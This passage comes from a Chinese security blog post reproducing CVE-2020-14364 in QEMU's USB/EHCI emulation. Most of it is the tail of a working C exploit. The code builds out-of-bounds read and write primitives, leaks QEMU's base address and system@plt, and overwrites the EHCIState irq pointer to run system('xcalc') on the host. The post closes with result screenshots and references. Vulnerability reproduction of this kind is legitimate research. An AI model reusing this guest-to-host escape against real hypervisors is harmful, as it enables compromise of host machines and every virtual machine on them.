do_copy_write(<span class="hljs-number">0</span>, offset+<span class="hljs-number">0x8</span>, offset<span class="hljs-number">-0x1010</span>);<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf) = payload;<br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0xffff</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;arb_write Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> target_addr)</span><br>&#123;<br>    setup_state_data();<br><br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br><br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0x1010</span>, <span class="hljs-number">0xfffffff8</span><span class="hljs-number">-0x1010</span>);<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf) = <span class="hljs-number">0x2000000000000080</span>; <span class="hljs-comment">// set setup[0] -&gt; USB_DIR_IN</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> target_offset = target_addr - data_buf_addr;<br><br>    do_copy_write(<span class="hljs-number">0x8</span>, <span class="hljs-number">0xffff</span>, target_offset - <span class="hljs-number">0x1018</span>);<br>    do_copy_read(); <span class="hljs-comment">// oob read</span><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;arb_read Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span><br>&#123;<br>    getchar();<br>    getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    init();<br><br>    iopl(<span class="hljs-number">3</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc080</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc0a0</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc0c0</span>);<br>    sleep(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// debug();</span><br><br>    init_state();<br>    set_length(<span class="hljs-number">0x200</span>, USB_DIR_IN);  <span class="hljs-comment">// s-&gt;setup_state = SETUP_STATE_DATA;</span><br>    set_length(<span class="hljs-number">0x2000</span>, USB_DIR_IN);<br>    do_copy_read(); <span class="hljs-comment">// oob read</span><br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf[%d]: %lx\n&quot;</span>, i, *(<span class="hljs-type">uint64_t</span> *)(data_buf + i * <span class="hljs-number">8</span>));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------------------------\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf_oob[%d]: %lx\n&quot;</span>, i, *(<span class="hljs-type">uint64_t</span> *)(data_buf_oob + i * <span class="hljs-number">8</span>));<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span>* <span class="hljs-title">usb_device_tmp</span> =</span> data_buf_oob + <span class="hljs-number">0x4</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> <span class="hljs-title">usb_device</span>;</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;usb_device, usb_device_tmp, <span class="hljs-keyword">sizeof</span>(USBDevice));<br><br>    dev_addr = usb_device.ep_ctl.dev;<br>    data_buf_addr = dev_addr + <span class="hljs-number">0xdc</span>;<br>    USBPort_addr = dev_addr + <span class="hljs-number">0x78</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBDevice dev_addr: 0x%llx\n&quot;</span>, dev_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBDevice-&gt;data_buf: 0x%llx\n&quot;</span>, data_buf_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBPort_addr: 0x%llx\n&quot;</span>, USBPort_addr);<br><br>    <span class="hljs-type">uint64_t</span> *tmp=data_buf_oob+<span class="hljs-number">0x4fc</span>;   <span class="hljs-comment">// desc_device_high</span><br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> leak_addr = *tmp;<br>    <span class="hljs-keyword">if</span>(leak_addr == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INIT DOWN,DO IT AGAIN\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = leak_addr - <span class="hljs-number">0x1111090</span>;<br>    <span class="hljs-type">uint64_t</span> system_plt = base + <span class="hljs-number">0x2D4B50</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak elf_base address : 0x%llx!\n&quot;</span>, base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak system_plt address: 0x%llx!\n&quot;</span>, system_plt);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> USBPort_ptr = arb_read(USBPort_addr);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> EHCIState_addr = USBPort_ptr - <span class="hljs-number">0x540</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> irq_addr = EHCIState_addr + <span class="hljs-number">0xc0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> fake_irq_addr = data_buf_addr; <span class="hljs-comment">//dev_addr + 0xdc;   </span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> irq_ptr = arb_read(irq_addr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EHCIState_addr: 0x%llx\n&quot;</span>, EHCIState_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBPort_ptr: 0x%llx\n&quot;</span>, USBPort_ptr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;irq_addr: 0x%llx\n&quot;</span>, irq_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake_irq_addr: 0x%llx\n&quot;</span>, fake_irq_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;irq_ptr: 0x%llx\n&quot;</span>, irq_ptr);<br><br>    <span class="hljs-comment">// construct fake_irq</span><br>    setup_state_data();<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x28</span>) = system_plt; <span class="hljs-comment">// handler</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x30</span>) = dev_addr+<span class="hljs-number">0xdc</span>+<span class="hljs-number">0x100</span>; <span class="hljs-comment">//opaque</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x38</span>) = <span class="hljs-number">0x3</span>; <span class="hljs-comment">//n</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf + <span class="hljs-number">0x100</span>) = <span class="hljs-number">0x636c616378</span>; <span class="hljs-comment">// &quot;xcalc; exit&quot;</span><br>    do_copy_write(<span class="hljs-number">0</span>, <span class="hljs-number">0xffff</span>, <span class="hljs-number">0xffff</span>);<br><br>    debug();<br><br>    <span class="hljs-comment">// write fake_irq</span><br>    arb_write(irq_addr, fake_irq_addr);<br><br>    <span class="hljs-comment">// // write back  irq_ptr</span><br>    <span class="hljs-comment">// arb_write(irq_addr, irq_ptr);</span><br><br>    <span class="hljs-comment">//printf(&quot;success233!\n&quot;);</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>



<h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>覆盖EHCIState-&gt;irq为可控地址。</p>
<p><img src="/img/CVE-2020-14364/image-20240723223839991.png" srcset="/img/loading.gif" lazyload alt="image-20240723223839991"></p>
<p>最终劫持控制流，执行<code>system(&quot;xcalc&quot;)</code>。</p>
<p><img src="/img/CVE-2020-14364/image-20240723223738928.png" srcset="/img/loading.gif" lazyload alt="image-20240723223738928"></p>
<p><img src="/img/CVE-2020-14364/image-20240723224353162.png" srcset="/img/loading.gif" lazyload alt="image-20240723224353162"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://lyyl.online/posts/3399981355">https://lyyl.online/posts/3399981355</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8320?time__1311=n4+xnD0DcDuDgDjgD0x05fbDyDmhjiQG7GG0YeD">https://xz.aliyun.com/t/8320?time__1311=n4%2BxnD0DcDuDgDjgD0x05fbDyDmhjiQG7GG0YeD</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/247829.html">https://www.freebuf.com/vuls/247829.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.intel.com/content/dam/www/public/us/en/documents/technical-specifications/ehci-specification-for-usb.pdf">https://www.intel.com/content/dam/www/public/us/en/documents/technical-specifications/ehci-specification-for-usb.pdf</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/cve-qemu-usb/">#cve qemu usb</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>QEMU: CVE-2020-14364漏洞复现</div>
      <div>http://example.com/2024/08/23/QEMU-CVE-2020-14364漏洞复现/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>l1s00t</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年8月23日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/07/01/QEMU-CVE-2019-6788%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="QEMU: CVE-2019-6788漏洞复现">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">QEMU: CVE-2019-6788漏洞复现</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/20/QEMU-PWN/" title="QEMU-PWN记录">
                        <span class="hidden-mobile">QEMU-PWN记录</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
